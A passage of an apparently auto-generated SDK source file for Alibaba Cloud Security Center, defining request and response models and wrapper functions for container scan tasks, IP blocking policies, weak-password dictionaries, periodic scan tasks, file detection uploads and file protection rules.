  if (!Util.isUnset(request.status)) {
    query['Status'] = request.status;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'CreateBinarySecurityPolicy',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Creates a binary security policy.
 *
 * @param request CreateBinarySecurityPolicyRequest
 * @return CreateBinarySecurityPolicyResponse
 */
async function createBinarySecurityPolicy(request: CreateBinarySecurityPolicyRequest): CreateBinarySecurityPolicyResponse {
  var runtime = new Util.RuntimeOptions{};
  return createBinarySecurityPolicyWithOptions(request, runtime);
}

model CreateContainerScanTaskRequest {
  clusterId?: string(name='ClusterId', description='The ID of the cluster to which the container belongs.

> You can call the [DescribeGroupedContainerInstances](https://help.aliyun.com/document_detail/182997.html) operation to query the IDs of clusters.', example='c22143730ab6e40b09ec7c1c51d4d****'),
  containerIds?: string(name='ContainerIds', description='The ID of the container.', example='c927cf190e886696db53cda0efb57145394ccf0bf9f525353fa5c22a26e4****'),
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh'),
}

model CreateContainerScanTaskResponseBody = {
  data?: {
    canCreate?: boolean(name='CanCreate', description='Indicates whether you can create more scan tasks.', example='true'),
    collectTime?: long(name='CollectTime', description='The collection time.', example='1644286364150'),
    execTime?: long(name='ExecTime', description='The execution time of the task.', example='1644286364150'),
    finishCount?: int32(name='FinishCount', description='The number of scan tasks that are complete.', example='33'),
    progress?: int32(name='Progress', description='The progress of the task.', example='100'),
    result?: string(name='Result', description='The execution result of the task.', example='SUCCESS'),
    status?: string(name='Status', description='The status of the task.', example='SUCCESS'),
    taskId?: string(name='TaskId', description='The ID of the task.', example='fc98d58eb56f699d49bf7ebbd6d7****'),
    totalCount?: int32(name='TotalCount', description='The total number of scan tasks.', example='62'),
  }(name='Data', description='The data returned.'),
  httpStatusCode?: int32(name='HttpStatusCode', description='The HTTP status code returned.', example='200'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='9F4E6157-9600-5588-86B9-38F09067****'),
}

model CreateContainerScanTaskResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: CreateContainerScanTaskResponseBody(name='body'),
}

/**
 * @summary Creates a container scan task.
 *
 * @param request CreateContainerScanTaskRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return CreateContainerScanTaskResponse
 */
async function createContainerScanTaskWithOptions(request: CreateContainerScanTaskRequest, runtime: Util.RuntimeOptions): CreateContainerScanTaskResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.clusterId)) {
    query['ClusterId'] = request.clusterId;
  }
  if (!Util.isUnset(request.containerIds)) {
    query['ContainerIds'] = request.containerIds;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'CreateContainerScanTask',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Creates a container scan task.
 *
 * @param request CreateContainerScanTaskRequest
 * @return CreateContainerScanTaskResponse
 */
async function createContainerScanTask(request: CreateContainerScanTaskRequest): CreateContainerScanTaskResponse {
  var runtime = new Util.RuntimeOptions{};
  return createContainerScanTaskWithOptions(request, runtime);
}

model CreateContainerScanTaskByAppNameRequest {
  appNames?: string(name='AppNames', description='The name of the container application.', example='app-centos-01'),
  clusterId?: string(name='ClusterId', description='The cluster ID.', example='cfb7a55a81f7246b5ac18845ea79a****'),
  lang?: string(name='Lang', description='The language of the content within the request and response.

*   **zh**: Chinese
*   **en**: English', example='zh'),
}

model CreateContainerScanTaskByAppNameResponseBody = {
  data?: {
    canCreate?: boolean(name='CanCreate', description='Indicates whether you can create more scan tasks. Valid values:

*   **true**
*   **false**', example='true'),
    collectTime?: long(name='CollectTime', description='The timestamp generated when the image information was collected. Unit: milliseconds.', example='1644286364150'),
    execTime?: long(name='ExecTime', description='The timestamp generated when the scan task started. Unit: milliseconds.', example='1644286364150'),
    finishCount?: int32(name='FinishCount', description='The number of container applications that are scanned.', example='5'),
    progress?: int32(name='Progress', description='The progress of the scan task in percentage.', example='100'),
    result?: string(name='Result', description='The result of the scan task. Valid values:

*   **SUCCESS**: The task is successful.
*   **TASK_NOT_SUPPORT_REGION**: The task is not supported in the region where the image is deployed.

>', example='SUCCESS'),
    status?: string(name='Status', description='The status of the scan task. Valid values:

*   **INIT**: The task is being initialized.
*   **PRE_ANALYZER**: The task is being pre-processed.
*   **SUCCESS**: The task succeeds.
*   **FAIL**: The task fails.', example='SUCCESS'),
    taskId?: string(name='TaskId', description='The ID of the scan task.', example='fc98d58eb56f699d49bf7ebbd6d7****'),
    totalCount?: int32(name='TotalCount', description='The total number of container applications that you want to scan.', example='5'),
  }(name='Data', description='The data returned if the request was successful.'),
  httpStatusCode?: int32(name='HttpStatusCode', description='The HTTP status code.', example='200'),
  requestId?: string(name='RequestId', description='The request ID.', example='1EE7B150-D67E-53FD-A52D-3E8E669A****'),
}

model CreateContainerScanTaskByAppNameResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: CreateContainerScanTaskByAppNameResponseBody(name='body'),
}

/**
 * @summary Creates a scan task for a running container application based on the application name.
 *
 * @param request CreateContainerScanTaskByAppNameRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return CreateContainerScanTaskByAppNameResponse
 */
async function createContainerScanTaskByAppNameWithOptions(request: CreateContainerScanTaskByAppNameRequest, runtime: Util.RuntimeOptions): CreateContainerScanTaskByAppNameResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.appNames)) {
    query['AppNames'] = request.appNames;
  }
  if (!Util.isUnset(request.clusterId)) {
    query['ClusterId'] = request.clusterId;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'CreateContainerScanTaskByAppName',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Creates a scan task for a running container application based on the application name.
 *
 * @param request CreateContainerScanTaskByAppNameRequest
 * @return CreateContainerScanTaskByAppNameResponse
 */
async function createContainerScanTaskByAppName(request: CreateContainerScanTaskByAppNameRequest): CreateContainerScanTaskByAppNameResponse {
  var runtime = new Util.RuntimeOptions{};
  return createContainerScanTaskByAppNameWithOptions(request, runtime);
}

model CreateCustomBlockRecordRequest {
  blockIp?: string(name='BlockIp', description='The IP address that you want to specify in the policy.

This parameter is required.', example='192.168.xx.xx'),
  bound?: string(name='Bound', description='The traffic direction that you want to specify in the policy. Valid values:

*   **in**: inbound
*   **out**: outbound

This parameter is required.', example='in'),
  expireTime?: long(name='ExpireTime', description='The expiration time of the policy.

This parameter is required.', example='1859094550000'),
  resourceOwnerId?: long(name='ResourceOwnerId'),
  uuids?: string(name='Uuids', description='The UUIDs of the servers. Separate multiple UUIDs with commas (,).

This parameter is required.', example='71c846d6-5c84-4714-acfc-58265bc3****,5013b5e8-1613-43a8-b4de-651db318****,df53f0ad-b3ba-4fe0-9ec7-f42a2ae2****'),
}

model CreateCustomBlockRecordResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='30CBF632-109F-596F-97F2-451C8B2A****'),
}

model CreateCustomBlockRecordResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: CreateCustomBlockRecordResponseBody(name='body'),
}

/**
 * @summary Creates an IP address blocking policy for one or more servers.
 *
 * @param request CreateCustomBlockRecordRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return CreateCustomBlockRecordResponse
 */
async function createCustomBlockRecordWithOptions(request: CreateCustomBlockRecordRequest, runtime: Util.RuntimeOptions): CreateCustomBlockRecordResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.blockIp)) {
    query['BlockIp'] = request.blockIp;
  }
  if (!Util.isUnset(request.bound)) {
    query['Bound'] = request.bound;
  }
  if (!Util.isUnset(request.expireTime)) {
    query['ExpireTime'] = request.expireTime;
  }
  if (!Util.isUnset(request.resourceOwnerId)) {
    query['ResourceOwnerId'] = request.resourceOwnerId;
  }
  if (!Util.isUnset(request.uuids)) {
    query['Uuids'] = request.uuids;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'CreateCustomBlockRecord',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Creates an IP address blocking policy for one or more servers.
 *
 * @param request CreateCustomBlockRecordRequest
 * @return CreateCustomBlockRecordResponse
 */
async function createCustomBlockRecord(request: CreateCustomBlockRecordRequest): CreateCustomBlockRecordResponse {
  var runtime = new Util.RuntimeOptions{};
  return createCustomBlockRecordWithOptions(request, runtime);
}

model CreateCustomizedDictRequest {
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh'),
  sourceIp?: string(name='SourceIp', description='The source IP address.', example='106.11.43.***'),
}

model CreateCustomizedDictResponseBody = {
  requestId?: string(name='RequestId', description='The request ID.', example='08571630-26D8-5E07-A4B7-DF8E89CF****'),
}

model CreateCustomizedDictResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: CreateCustomizedDictResponseBody(name='body'),
}

/**
 * @summary Creates custom weak password rules.
 *
 * @param request CreateCustomizedDictRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return CreateCustomizedDictResponse
 */
async function createCustomizedDictWithOptions(request: CreateCustomizedDictRequest, runtime: Util.RuntimeOptions): CreateCustomizedDictResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'CreateCustomizedDict',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Creates custom weak password rules.
 *
 * @param request CreateCustomizedDictRequest
 * @return CreateCustomizedDictResponse
 */
async function createCustomizedDict(request: CreateCustomizedDictRequest): CreateCustomizedDictResponse {
  var runtime = new Util.RuntimeOptions{};
  return createCustomizedDictWithOptions(request, runtime);
}

model CreateCycleTaskRequest {
  enable?: int32(name='Enable', description='Specifies whether to enable the task. Valid values:

*   **1**: yes
*   **0**: no

This parameter is required.', example='1'),
  firstDateStr?: long(name='FirstDateStr', description='The first time when the task is performed.

This parameter is required.', example='1650556800000'),
  intervalPeriod?: int32(name='IntervalPeriod', description='The interval of the task.

This parameter is required.', example='7'),
  param?: string(name='Param', description='The additional information.', example='{
      "targetInfo": [
            {
                  "type": "groupId",
                  "name": "TI HOST",
                  "target": 10597***
            },
            {
                  "type": "groupId",
                  "name": "expense HOST",
                  "target": 10597***
            }
      ]
}'),
  periodUnit?: string(name='PeriodUnit', description='The unit of the scan interval. Valid values:

*   **day**: days
*   **hour**: hours

This parameter is required.', example='day'),
  source?: string(name='Source', description='The additional source for the task.', example='console_batch'),
  targetEndTime?: int32(name='TargetEndTime', description='The time when the task ends. Unit: hours.

This parameter is required.', example='6'),
  targetStartTime?: int32(name='TargetStartTime', description='The time when the task is started. Unit: hours.

This parameter is required.', example='0'),
  taskName?: string(name='TaskName', description='The name of the task. Valid values:

*   **VIRUS_VUL_SCHEDULE_SCAN**: virus scan task
*   **IMAGE_SCAN**: image scan task
*   **EMG_VUL_SCHEDULE_SCAN**: urgent vulnerability scan task

This parameter is required.', example='EMG_VUL_SCHEDULE_SCAN'),
  taskType?: string(name='TaskType', description='The type of the task. Valid values:

*   **VIRUS_VUL_SCHEDULE_SCAN**: virus scan task
*   **IMAGE_SCAN**: image scan task
*   **EMG_VUL_SCHEDULE_SCAN**: urgent vulnerability scan task

This parameter is required.', example='VIRUS_VUL_SCHEDULE_SCAN'),
}

model CreateCycleTaskResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='86CFF42E-E00A-57A3-8656-22291EFB****'),
}

model CreateCycleTaskResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: CreateCycleTaskResponseBody(name='body'),
}

/**
 * @summary Creates a periodic scan task. The task can be an image scan task, urgent vulnerability scan task, or virus scan task.
 *
 * @param request CreateCycleTaskRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return CreateCycleTaskResponse
 */
async function createCycleTaskWithOptions(request: CreateCycleTaskRequest, runtime: Util.RuntimeOptions): CreateCycleTaskResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.enable)) {
    query['Enable'] = request.enable;
  }
  if (!Util.isUnset(request.firstDateStr)) {
    query['FirstDateStr'] = request.firstDateStr;
  }
  if (!Util.isUnset(request.intervalPeriod)) {
    query['IntervalPeriod'] = request.intervalPeriod;
  }
  if (!Util.isUnset(request.param)) {
    query['Param'] = request.param;
  }
  if (!Util.isUnset(request.periodUnit)) {
    query['PeriodUnit'] = request.periodUnit;
  }
  if (!Util.isUnset(request.source)) {
    query['Source'] = request.source;
  }
  if (!Util.isUnset(request.targetEndTime)) {
    query['TargetEndTime'] = request.targetEndTime;
  }
  if (!Util.isUnset(request.targetStartTime)) {
    query['TargetStartTime'] = request.targetStartTime;
  }
  if (!Util.isUnset(request.taskName)) {
    query['TaskName'] = request.taskName;
  }
  if (!Util.isUnset(request.taskType)) {
    query['TaskType'] = request.taskType;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'CreateCycleTask',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Creates a periodic scan task. The task can be an image scan task, urgent vulnerability scan task, or virus scan task.
 *
 * @param request CreateCycleTaskRequest
 * @return CreateCycleTaskResponse
 */
async function createCycleTask(request: CreateCycleTaskRequest): CreateCycleTaskResponse {
  var runtime = new Util.RuntimeOptions{};
  return createCycleTaskWithOptions(request, runtime);
}

model CreateDynamicDictRequest {
  override?: boolean(name='Override', description='Specifies whether to overwrite existing data. Valid values:

*   true
*   false', example='false'),
  sourceIp?: string(name='SourceIp', description='The source IP address.', example='123.103.9.***'),
}

model CreateDynamicDictResponseBody = {
  requestId?: string(name='RequestId', description='The request ID.', example='EACE89CB-F32B-5A85-9242-D474A2ED****'),
}

model CreateDynamicDictResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: CreateDynamicDictResponseBody(name='body'),
}

/**
 * @summary Creates a dynamic dictionary of weak passwords.
 *
 * @param request CreateDynamicDictRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return CreateDynamicDictResponse
 */
async function createDynamicDictWithOptions(request: CreateDynamicDictRequest, runtime: Util.RuntimeOptions): CreateDynamicDictResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.override)) {
    query['Override'] = request.override;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'CreateDynamicDict',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Creates a dynamic dictionary of weak passwords.
 *
 * @param request CreateDynamicDictRequest
 * @return CreateDynamicDictResponse
 */
async function createDynamicDict(request: CreateDynamicDictRequest): CreateDynamicDictResponse {
  var runtime = new Util.RuntimeOptions{};
  return createDynamicDictWithOptions(request, runtime);
}

model CreateFileDetectRequest {
  decompress?: boolean(name='Decompress', description='Whether to decompress or not. Valid values:

- true: To decompress.
- false: Not to decompress.', example='false'),
  decompressMaxFileCount?: int32(name='DecompressMaxFileCount', description='The maximum number of files for decompression. The minimum value is 1, and the maximum value is 1000. If the decompression level exceeds the maximum, the decompression operation will be terminated, but the detection of decompressed files will not be affected.', example='100'),
  decompressMaxLayer?: int32(name='DecompressMaxLayer', description='The maximum level of decompression when dealing with nested compressed files with multiple levels. The minimum value is 1, and the maximum value is 5. If the decompression level exceeds the maximum, the decompression operation will be terminated, but the detection of decompressed files will not be affected.', example='1'),
  downloadUrl?: string(name='DownloadUrl', description='The URL that is used to download the file. You can specify this parameter to trigger file detection without the need to upload the file in advance.', example='https://xxxxxxxx.oss-cn-hangzhou-1.aliyuncs.com/xxxxx/xxxxxxxxxxxxxx?Expires=1671448125&OSSAccessKeyId=xxx'),
  hashKey?: string(name='HashKey', description='The identifier of the file. Only MD5 hash values are supported.

This parameter is required.', example='0a212417e65c26ff133cfff28f6c****'),
  ossKey?: string(name='OssKey', description='The key of the file that is stored in the Object Storage Service (OSS) bucket. You can call the [CreateFileDetectUploadUrl](~~CreateFileDetectUploadUrl~~) operation to query the keys of files.', example='1/2022/06/23/15/41/16559701077444693a0c6-33b2-4cc2-a99f-9f38b8b8****'),
  sourceIp?: string(name='SourceIp', description='The source IP address of the request.', example='115.213.XX.XX'),
  type?: int32(name='Type', description='The type of the file. Valid values:

*   **0**: unknown files
*   **1**: binary files
*   **2**: webshell files
*   **4**: script files

>  If you do not know the type of the file, set this parameter to 0.

This parameter is required.', example='0'),
}

model CreateFileDetectResponseBody = {
  hashKey?: string(name='HashKey', description='The identifier of the file.', example='0a212417e65c26ff133cfff28f6c****'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='7E0618A9-D5EF-4220-9471-C42B5E92719F'),
}

model CreateFileDetectResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: CreateFileDetectResponseBody(name='body'),
}

/**
 * @summary Pushes a file to the cloud for detection.
 *
 * @description You can call this operation to push a file to the cloud for detection. Before you call this operation, make sure that the file is uploaded. You can call the CreateFileDetectUploadUrl operation to upload the file.
 * The HashKey parameter is included in all API operations that are related to the file detection feature. The parameter specifies the unique identifier of a file. Only MD5 hash values are supported. Before you call this operation, calculate the MD5 hash value of the file.
 *
 * @param request CreateFileDetectRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return CreateFileDetectResponse
 */
async function createFileDetectWithOptions(request: CreateFileDetectRequest, runtime: Util.RuntimeOptions): CreateFileDetectResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.decompress)) {
    query['Decompress'] = request.decompress;
  }
  if (!Util.isUnset(request.decompressMaxFileCount)) {
    query['DecompressMaxFileCount'] = request.decompressMaxFileCount;
  }
  if (!Util.isUnset(request.decompressMaxLayer)) {
    query['DecompressMaxLayer'] = request.decompressMaxLayer;
  }
  if (!Util.isUnset(request.downloadUrl)) {
    query['DownloadUrl'] = request.downloadUrl;
  }
  if (!Util.isUnset(request.hashKey)) {
    query['HashKey'] = request.hashKey;
  }
  if (!Util.isUnset(request.ossKey)) {
    query['OssKey'] = request.ossKey;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  if (!Util.isUnset(request.type)) {
    query['Type'] = request.type;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'CreateFileDetect',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Pushes a file to the cloud for detection.
 *
 * @description You can call this operation to push a file to the cloud for detection. Before you call this operation, make sure that the file is uploaded. You can call the CreateFileDetectUploadUrl operation to upload the file.
 * The HashKey parameter is included in all API operations that are related to the file detection feature. The parameter specifies the unique identifier of a file. Only MD5 hash values are supported. Before you call this operation, calculate the MD5 hash value of the file.
 *
 * @param request CreateFileDetectRequest
 * @return CreateFileDetectResponse
 */
async function createFileDetect(request: CreateFileDetectRequest): CreateFileDetectResponse {
  var runtime = new Util.RuntimeOptions{};
  return createFileDetectWithOptions(request, runtime);
}

model CreateFileDetectUploadUrlRequest {
  hashKeyContextList?: [ 
    {
      fileSize?: int32(name='FileSize', description='The size of the file. Unit: bytes.', example='2698557'),
      hashKey?: string(name='HashKey', description='The hash value of the file.', example='30319dd5cee8f894766e479cac170da0'),
    }
  ](name='HashKeyContextList', description='The hash values of files.

> You must specify at least one of the **HashKeyList** and **HashKeyContextList** parameters.'),
  hashKeyList?: [ string ](name='HashKeyList', description='The identifiers of files. Only MD5 hash values are supported.

> You must specify at least one of the **HashKeyList** and **HashKeyContextList** parameters.', example='CreateFileDetectUploadUrl'),
  type?: int32(name='Type', description='The type of the file. Valid values:

*   **0**: unknown file
*   **1**: binary file
*   **2**: webshell file
*   **4**: script file

> If you do not know the type of the file, set this parameter to **0**.

This parameter is required.', example='0'),
}

model CreateFileDetectUploadUrlResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='09969D2C-4FAD-429E-BFBF-9A60DEF8BF6F'),
  uploadUrlList?: [ 
    {
      code?: string(name='Code', description='The status code returned. The status code **200** indicates that the request was successful. Other status codes indicate that the request failed. You can identify the cause of the failure based on the status code.', example='200'),
      context?: {
        accessId?: string(name='AccessId', description='The AccessKey ID that is used to access the OSS bucket.', example='LTAI4G1mgPbjvGQuiV1X****'),
        ossKey?: string(name='OssKey', description='The key of the file that is used after the file is uploaded to the OSS bucket.', example='1/2022/06/23/15/41/16559701077444693a0c6-33b2-4cc2-a99f-9f38b8b8****'),
        policy?: string(name='Policy', description='The policy that poses limits on file upload. For example, the policy can limit the size of the file.', example='eyJleHBpcmF0aW9uIjoiMjAyMi0wNy0yM1QxMDo1ODoxMC43NTNaIiwiY29uZGl0aW9ucyI6W1siY29udGVudC1sZW5ndGgtcmFuZ2UiLDAsMjA5NzE1MjBdLFsiZXEiLCIka2V5IiwiMS8yMDIyLzA2LzIzLzE4LzU4LzE2NTU5ODE4OTA3NTM4NTc2MjFkNS1kN2E1LTQ5YzAtOGJjZi0yMTMyY2JiYTdmYzMi****'),
        signature?: string(name='Signature', description='The signature that is used to upload the file.', example='wDhPgVdnY/bkKFYcYFl+4crl****'),
      }(name='Context', description='The signature information.'),
      expire?: string(name='Expire', description='The timestamp when the values of the parameters expire. Unit: milliseconds.', example='1658562101370'),
      fileExist?: boolean(name='FileExist', description='Indicates whether the file exists in the cloud. Valid values:

*   **true**: The file exists in the cloud. You do not need to upload the file.
*   **false**: The file does not exist in the cloud. You must upload the file.', example='false'),
      hashKey?: string(name='HashKey', description='The identifier of the file.', example='0a212417e65c26ff133cfff28f6c****'),
      internalUrl?: string(name='InternalUrl', description='The internal endpoint of the URL to which the file is uploaded.', example='http://example.com'),
      message?: string(name='Message', description='The error message returned.', example='successful'),
      publicUrl?: string(name='PublicUrl', description='The public endpoint of the URL to which the file is uploaded.', example='http://example.com'),
    }
  ](name='UploadUrlList', description='An array consisting of the parameters that are required to upload a file.'),
}

model CreateFileDetectUploadUrlResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: CreateFileDetectUploadUrlResponseBody(name='body'),
}

/**
 * @summary Queries the parameters that are required to upload a file for detection.
 *
 * @description You can call this operation to query the parameters that are required to upload a file for detection. If the value of the response parameter FileExist is true, the file that you want to upload for detection already exists in the cloud. In this case, you can directly push the file for detection. If the value of the response parameter FileExist is false, you must use the form upload method to upload the file to the specified Object Storage Service (OSS) bucket based on the response parameters of this operation.
 * The form upload method is provided by OSS. For more information, see [Form upload](https://help.aliyun.com/document_detail/84788.html).
 * The HashKey parameter is included in all API operations that are related to the file detection feature. The parameter specifies the unique identifier of a file. Only MD5 hash values are supported. Before you call this operation, calculate the MD5 hash value of the file.
 *
 * @param request CreateFileDetectUploadUrlRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return CreateFileDetectUploadUrlResponse
 */
async function createFileDetectUploadUrlWithOptions(request: CreateFileDetectUploadUrlRequest, runtime: Util.RuntimeOptions): CreateFileDetectUploadUrlResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.hashKeyContextList)) {
    query['HashKeyContextList'] = request.hashKeyContextList;
  }
  if (!Util.isUnset(request.hashKeyList)) {
    query['HashKeyList'] = request.hashKeyList;
  }
  if (!Util.isUnset(request.type)) {
    query['Type'] = request.type;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'CreateFileDetectUploadUrl',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries the parameters that are required to upload a file for detection.
 *
 * @description You can call this operation to query the parameters that are required to upload a file for detection. If the value of the response parameter FileExist is true, the file that you want to upload for detection already exists in the cloud. In this case, you can directly push the file for detection. If the value of the response parameter FileExist is false, you must use the form upload method to upload the file to the specified Object Storage Service (OSS) bucket based on the response parameters of this operation.
 * The form upload method is provided by OSS. For more information, see [Form upload](https://help.aliyun.com/document_detail/84788.html).
 * The HashKey parameter is included in all API operations that are related to the file detection feature. The parameter specifies the unique identifier of a file. Only MD5 hash values are supported. Before you call this operation, calculate the MD5 hash value of the file.
 *
 * @param request CreateFileDetectUploadUrlRequest
 * @return CreateFileDetectUploadUrlResponse
 */
async function createFileDetectUploadUrl(request: CreateFileDetectUploadUrlRequest): CreateFileDetectUploadUrlResponse {
  var runtime = new Util.RuntimeOptions{};
  return createFileDetectUploadUrlWithOptions(request, runtime);
}

model CreateFileProtectRuleRequest {
  alertLevel?: int32(name='AlertLevel', description='The severity of alerts. Valid values:

*   0: does not generate alerts
*   1: sends notifications
*   2: suspicious
*   3: high-risk', example='0'),
  fileOps?: [ string ](name='FileOps', description='The operations that you want to perform on the files.

This parameter is required.'),
  filePaths?: [ string ](name='FilePaths', description='The paths to the files that you want to monitor. Wildcard characters are supported.

This parameter is required.'),
  platform?: string(name='Platform', description='The type of the operating system. Valid values:

*   **windows**: Windows
*   **linux**: Linux', example='linux'),
  procPaths?: [ string ](name='ProcPaths', description='The paths to the processes that you want to monitor. Wildcard characters are supported.

This parameter is required.'),
  ruleAction?: string(name='RuleAction', description='The handling method of the rule. Valid values:

*   pass: allow
*   alert

This parameter is required.', example='pass'),
  ruleName?: string(name='RuleName', description='The name of the rule.

This parameter is required.', example='tetsRule'),
  status?: int32(name='Status', description='Specifies whether to enable the rule. Valid values:

*   **1**: yes
*   **0**: no', example='1'),
  switchId?: string(name='SwitchId', description='The switch ID of the rule.', example='FILE_PROTECT_RULE_SWITCH_TYPE_0000'),
}

model CreateFileProtectRuleResponseBody = {
  requestId?: string(name='RequestId', description='The request ID.', example='EC7C8984-D108-516F-9D36-3DF1D1228CCA'),
  ruleId?: long(name='RuleId', description='The ID of the rule.', example='123'),
}

model CreateFileProtectRuleResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: CreateFileProtectRuleResponseBody(name='body'),
}

/**
 * @summary Creates a core file monitoring rule.
 *
 * @param request CreateFileProtectRuleRequest
